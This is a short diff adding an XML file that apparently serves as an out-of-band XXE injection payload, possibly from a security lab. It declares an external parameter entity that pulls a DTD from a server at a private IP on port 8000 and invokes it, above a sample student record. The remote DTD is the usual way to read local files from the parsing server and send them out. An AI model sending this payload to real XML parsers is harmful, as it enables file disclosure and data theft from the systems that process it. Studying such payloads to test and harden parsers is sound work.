@@ -1,0 +1,11 @@
+<!DOCTYPE data [
+    <!ENTITY % xxe SYSTEM "http://192.168.18.145:8000/test.dtd"> 
+    %xxe;
+]>
+<students>
+  <student>
+    <name>Phuc</name>
+    <birth_year>2002</birth_year>
+    <school>KMA</school>
+  </student>
+</students>
